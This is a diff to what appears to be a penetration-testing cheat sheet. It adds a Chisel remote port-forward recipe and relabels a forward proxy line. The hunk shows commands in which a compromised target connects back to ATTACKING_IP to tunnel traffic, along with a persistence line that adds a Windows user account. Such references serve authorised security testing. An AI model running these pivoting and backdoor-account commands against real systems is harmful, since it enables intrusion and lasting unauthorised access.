@@ -127,7 +127,10 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
     target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
 ### Chisel socks Forward Proxy 
     target    ./chisel server -p LISTEN_PORT --socks5  
-    kali    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
+    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
+### Chisel Remote Port Forward 
+    attack    ./chisel server -p LISTEN_PORT --reverse &  
+    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
  ____
  # Persistence
      net user USERNAME PASSWORD /add
